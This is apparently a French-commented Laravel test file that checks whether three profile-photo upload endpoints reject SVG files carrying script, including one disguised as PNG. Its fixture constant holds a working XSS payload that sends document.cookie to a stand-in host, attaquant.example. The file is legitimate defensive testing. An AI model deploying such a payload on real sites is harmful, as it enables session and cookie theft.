<?php

namespace Tests\Feature\Security;

use App\Livewire\Provider\Onboarding\ProviderOnboardingWizard;
use App\Models\ProviderProfile;
use App\Models\User;
use App\Support\Validation\ImagesTeleversees;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Laravel\Sanctum\Sanctum;
use Livewire\Features\SupportFileUploads\FileUploadConfiguration;
use Livewire\Livewire;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/** M-4 — un SVG déposé comme photo de profil est un document XML qui peut porter du script. */
class UploadImageSvgXssTest extends TestCase
{
    use RefreshDatabase;

    /** SVG valide portant une charge active : c'est l'attaque. */
    private const SVG_AVEC_SCRIPT = <<<'SVG'
        <?xml version="1.0" encoding="UTF-8"?>
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
          <script type="text/javascript">fetch('https://attaquant.example/vol?c='+document.cookie)</script>
          <circle cx="50" cy="50" r="40" fill="red" onload="alert(document.domain)"/>
        </svg>
        SVG;

    /**
     * Un vrai fichier 1×1 par format accepté, encodé en dur : l'extension GD n'est pas chargée sur ce poste, on ne peut donc pas les générer.
     *
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function formatsAcceptes(): array
    {
        $jpeg = '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a'
            .'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA'
            .'AAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==';

        return [
            'jpg' => ['jpg', $jpeg, 'jpg'],
            'jpeg' => ['jpeg', $jpeg, 'jpg'],
            'png' => ['png', 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'png'],
            'gif' => ['gif', 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'gif'],
            'bmp' => ['bmp', 'Qk1GAAAAAAAAADYAAAAoAAAAAQAAAAEAAAABABgAAAAAABAAAADDDgAAww4AAAAAAAAAAAAA////AA==', 'bmp'],
            'webp' => ['webp', 'UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==', 'webp'],

            // LE HEIC ET LE HEIF SONT DEUX ENTREES DISTINCTES, ET LES DEUX PORTENT.
            'heic' => ['heic', 'AAAAGGZ0eXBoZWljAAAAAGhlaWNtaWYx', 'heic'],
            'heif' => ['heif', 'AAAAGGZ0eXBtaWYxAAAAAG1pZjFoZWlj', 'heif'],
        ];
    }

    private string $dossierTemporaire;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('public');

        $this->dossierTemporaire = sys_get_temp_dir().'/cx-upload-'.Str::random(12);
        mkdir($this->dossierTemporaire, 0777, true);
    }

    protected function tearDown(): void
    {
        foreach (glob($this->dossierTemporaire.'/*') ?: [] as $fichier) {
            @unlink($fichier);
        }
        @rmdir($this->dossierTemporaire);

        parent::tearDown();
    }

    // ---------------------------------------------------------------------
    // Fabrication des charges — de vrais octets, jamais d'étiquette déclarée
    // ---------------------------------------------------------------------

    /** Construit un vrai fichier téléversé à partir d'octets réels. */
    private function televerse(string $nom, string $contenu, string $typeDeclare): UploadedFile
    {
        $chemin = $this->dossierTemporaire.'/'.$nom;
        file_put_contents($chemin, $contenu);

        return new UploadedFile($chemin, $nom, $typeDeclare, null, true);
    }

    private function svgDAttaque(string $nom = 'avatar.svg'): UploadedFile
    {
        return $this->televerse($nom, self::SVG_AVEC_SCRIPT, 'image/svg+xml');
    }

    private function imageReelle(string $extension, string $base64): UploadedFile
    {
        return $this->televerse('photo.'.$extension, (string) base64_decode($base64, true), 'image/'.$extension);
    }

    private function pngLegitime(string $nom = 'avatar.png'): UploadedFile
    {
        return $this->televerse(
            $nom,
            (string) base64_decode(self::formatsAcceptes()['png'][1], true),
            'image/png',
        );
    }

    /** Dépose des octets dans le tampon de Livewire et rend le nom de fichier temporaire. */
    private function deposeDansLeTamponLivewire(string $nomOrigine, string $contenu): string
    {
        $nom = Str::random(30)
            .'-meta'.str_replace('/', '_', base64_encode($nomOrigine)).'-'
            .'.'.pathinfo($nomOrigine, PATHINFO_EXTENSION);

        FileUploadConfiguration::storage()->put(FileUploadConfiguration::path($nom), $contenu);

        return $nom;
    }

    // ---------------------------------------------------------------------
    // 1. Le vecteur d'attaque, aux TROIS points d'entrée
    // ---------------------------------------------------------------------

    public function test_l_avatar_client_refuse_un_svg_porteur_de_script(): void
    {
        $client = User::factory()->create(['role' => 'client']);
        Sanctum::actingAs($client);

        $reponse = $this->post(
            '/api/client/profile/avatar',
            ['avatar' => $this->svgDAttaque()],
            ['Accept' => 'application/json'],
        );

        $reponse->assertStatus(422)->assertJsonValidationErrors('avatar');

        // Le refus doit être total : rien n'atteint le disque public, rien n'est référencé.
        $this->assertNull($client->fresh()->profile_photo_path);
        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    public function test_l_api_d_onboarding_prestataire_refuse_un_svg_porteur_de_script(): void
    {
        $prestataire = User::factory()->employe()->create();
        Sanctum::actingAs($prestataire);

        $reponse = $this->post(
            '/api/provider/onboarding/profile',
            ['name' => 'Jean Dupont', 'photo' => $this->svgDAttaque('photo.svg')],
            ['Accept' => 'application/json'],
        );

        $reponse->assertStatus(422)->assertJsonValidationErrors('photo');

        $this->assertSame([], Storage::disk('public')->allFiles());
        $this->assertDatabaseMissing('provider_profiles', ['user_id' => $prestataire->id]);
    }

    /** La troisième porte, celle qu'on avait oubliée : le wizard web écrit sur le même disque public que l'API mobile ci-dessus. */
    public function test_le_wizard_web_d_onboarding_refuse_un_svg_porteur_de_script(): void
    {
        $prestataire = User::factory()->employe()->create();
        $this->actingAs($prestataire);

        $tampon = $this->deposeDansLeTamponLivewire('photo.svg', self::SVG_AVEC_SCRIPT);

        Livewire::test(ProviderOnboardingWizard::class)
            ->call('_finishUpload', 'photo', [$tampon], false)
            ->set('name', 'Jean Dupont')
            ->call('saveStep0')
            ->assertHasErrors('photo')
            ->assertSet('currentStep', 0);

        $this->assertSame(
            [],
            Storage::disk('public')->allFiles(),
            'Le wizard web a laissé un fichier sur le disque public alors que la validation devait le refuser.',
        );
    }

    /** Le nom de fichier ne doit pas servir de porte dérobée : renommer la charge en `.png` ne change rien, puisque la validation lit le contenu et non l'extension annoncée. */
    public function test_un_svg_deguise_en_png_est_refuse_lui_aussi(): void
    {
        $client = User::factory()->create(['role' => 'client']);
        Sanctum::actingAs($client);

        $this->post(
            '/api/client/profile/avatar',
            ['avatar' => $this->televerse('innocent.png', self::SVG_AVEC_SCRIPT, 'image/png')],
            ['Accept' => 'application/json'],
        )->assertStatus(422)->assertJsonValidationErrors('avatar');

        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    public function test_le_wizard_web_refuse_aussi_un_svg_deguise_en_png(): void
    {
        $this->actingAs(User::factory()->employe()->create());

        $tampon = $this->deposeDansLeTamponLivewire('innocent.png', self::SVG_AVEC_SCRIPT);

        Livewire::test(ProviderOnboardingWizard::class)
            ->call('_finishUpload', 'photo', [$tampon], false)
            ->set('name', 'Jean Dupont')
            ->call('saveStep0')
            ->assertHasErrors('photo');

        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    // ---------------------------------------------------------------------
    // 2. Le chemin normal, aux TROIS points d'entrée
    // ---------------------------------------------------------------------

    /** Un fichier légitime de CHAQUE format accepté doit encore passer. */
    #[DataProvider('formatsAcceptes')]
    public function test_l_avatar_client_accepte_chaque_format_de_la_liste(string $extension, string $base64, string $extensionRangee): void
    {
        $client = User::factory()->create(['role' => 'client']);
        Sanctum::actingAs($client);

        $this->post(
            '/api/client/profile/avatar',
            ['avatar' => $this->imageReelle($extension, $base64)],
            ['Accept' => 'application/json'],
        )->assertOk()->assertJsonPath('ok', true);

        $chemin = $client->fresh()->profile_photo_path;

        $this->assertNotNull($chemin, "Un fichier .{$extension} légitime a été refusé par l'avatar client.");
        $this->assertStringEndsWith('.'.$extensionRangee, $chemin);
        Storage::disk('public')->assertExists($chemin);
    }

    #[DataProvider('formatsAcceptes')]
    public function test_l_api_d_onboarding_accepte_chaque_format_de_la_liste(string $extension, string $base64, string $extensionRangee): void
    {
        $prestataire = User::factory()->employe()->create();
        Sanctum::actingAs($prestataire);

        $reponse = $this->post(
            '/api/provider/onboarding/profile',
            ['name' => 'Jean Dupont', 'photo' => $this->imageReelle($extension, $base64)],
            ['Accept' => 'application/json'],
        );

        $reponse->assertOk()->assertJsonPath('ok', true);

        $chemin = (string) $reponse->json('photo_path');

        $this->assertStringEndsWith(
            '.'.$extensionRangee,
            $chemin,
            "Un fichier .{$extension} légitime a été refusé par l'API d'onboarding.",
        );
        Storage::disk('public')->assertExists($chemin);
    }

    /** Le même jeu de formats côté web. */
    #[DataProvider('formatsAcceptes')]
    public function test_le_wizard_web_accepte_chaque_format_de_la_liste(string $extension, string $base64, string $extensionRangee): void
    {
        $prestataire = User::factory()->employe()->create();
        $this->actingAs($prestataire);

        $tampon = $this->deposeDansLeTamponLivewire(
            'photo.'.$extension,
            (string) base64_decode($base64, true),
        );

        Livewire::test(ProviderOnboardingWizard::class)
            ->call('_finishUpload', 'photo', [$tampon], false)
            ->set('name', 'Jean Dupont')
            ->call('saveStep0')
            ->assertHasNoErrors()
            ->assertSet('currentStep', 1);

        $chemin = (string) ProviderProfile::where('user_id', $prestataire->id)->first()?->photo_path;

        $this->assertStringEndsWith(
            '.'.$extensionRangee,
            $chemin,
            "Un fichier .{$extension} légitime a été refusé par le wizard web.",
        );
        Storage::disk('public')->assertExists($chemin);
    }

    /** La photo reste facultative des deux côtés : l'étape 0 sert aussi à saisir un nom seul. */
    public function test_l_onboarding_accepte_toujours_une_etape_sans_photo(): void
    {
        $prestataire = User::factory()->employe()->create();
        Sanctum::actingAs($prestataire);

        $this->postJson('/api/provider/onboarding/profile', ['name' => 'Jean Dupont'])
            ->assertOk()
            ->assertJsonPath('ok', true);

        $this->assertSame('Jean Dupont', $prestataire->fresh()->name);
    }

    public function test_le_wizard_web_accepte_toujours_une_etape_sans_photo(): void
    {
        $prestataire = User::factory()->employe()->create();
        $this->actingAs($prestataire);

        Livewire::test(ProviderOnboardingWizard::class)
            ->set('name', 'Jean Dupont')
            ->set('photo', null)
            ->call('saveStep0')
            ->assertHasNoErrors()
            ->assertSet('currentStep', 1);
    }

    // ---------------------------------------------------------------------
    // 3. Sentinelle sur le reste du dépôt
    // ---------------------------------------------------------------------

    /** Les trois points doivent lire la MÊME liste, et cette parité-là ne se voit pas en boîte noire aujourd'hui : sur Laravel 12.62 `image` vaut exactement notre liste (jpg, jpeg, png, gif, bmp, webp). */
    public function test_les_trois_points_lisent_la_meme_liste(): void
    {
        $fichiers = [
            'app/Http/Controllers/Api/Client/ClientProfileController.php',
            'app/Http/Controllers/Api/Provider/ProviderOnboardingController.php',
            'app/Livewire/Provider/Onboarding/ProviderOnboardingWizard.php',
        ];

        // TOUS LES POINTS DE TELEVERSEMENT FAUTIFS D'UN COUP.
        $fautifs = [];

        foreach ($fichiers as $fichier) {
            $source = (string) file_get_contents(base_path($fichier));

            if (! str_contains($source, 'ImagesTeleversees::regles(')) {
                $fautifs[] = "{$fichier} : n appelle plus la liste partagee";
            }

            if (str_contains($source, "'image'")) {
                $fautifs[] = "{$fichier} : revenu a la regle `image` de Laravel, dont la definition "
                    .'vit dans vendor/ et peut accueillir le svg a la prochaine montee de version';
            }
        }

        $this->assertSame([], $fautifs, 'Ces points de televersement echappent a la liste partagee.');
    }

    /** Neuf autres points de téléversement du dépôt valident encore avec la règle `image` nue (MissionFieldActionController ×2, MissionExecutionBoard ×2, MesRendezVous ×2, LitigesClient, AiQuotePhoto, AiQuoteController). */
    public function test_la_regle_image_nue_de_laravel_refuse_encore_le_svg(): void
    {
        $validateur = Validator::make(
            ['fichier' => $this->svgDAttaque('sentinelle.svg')],
            ['fichier' => ['image']],
        );

        $this->assertTrue(
            $validateur->fails(),
            'La règle `image` de Laravel accepte désormais le svg : les points de téléversement du '.
            "dépôt qui l'utilisent encore sont devenus des XSS stockés — ceux qui écrivent sur le ".
            'disque `private` restent servis par un contrôleur, ceux qui écrivent sur `public` sont '.
            'exploitables directement. Basculer chacun sur ImagesTeleversees::regles(), comme les '.
            'trois photos de profil.',
        );
    }

    /** Le pendant du test précédent : notre liste ne doit rien REFUSER que `image` accepte, sans quoi on casse des téléversements légitimes sans rien fermer. */
    public function test_notre_liste_couvre_image_sans_le_svg(): void
    {
        // ON VERROUILLE LE RAISONNEMENT, PAS LA VALEUR DU JOUR.
        $natifs = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];

        $disparus = array_values(array_diff($natifs, ImagesTeleversees::EXTENSIONS));

        $this->assertSame(
            [],
            $disparus,
            'Ces formats ont disparu de la liste partagee. Refuser un format matriciel legitime ne '
            .'ferme aucune faille : ca empeche juste un prestataire de s inscrire.',
        );

        // LES AJOUTS ASSUMES, et le motif de chacun.
        $ajoutsAssumes = ['heic', 'heif'];

        $this->assertSame(
            [],
            array_values(array_diff(ImagesTeleversees::EXTENSIONS, $natifs, $ajoutsAssumes)),
            'Un format est entre dans la liste partagee sans etre declare ici. Chaque ajout doit '
            .'etre un conteneur matriciel -- pas un document capable de porter un script -- et '
            .'doit etre reconnu par `finfo`, sans quoi la regle accepte sur le papier et refuse en '
            .'pratique.',
        );

        $this->assertNotContains(
            'svg',
            ImagesTeleversees::EXTENSIONS,
            'Le svg est de retour dans la liste : un document XML porteur de script atterrirait '.
            'sur le disque public, servi sur notre domaine.',
        );
    }
}
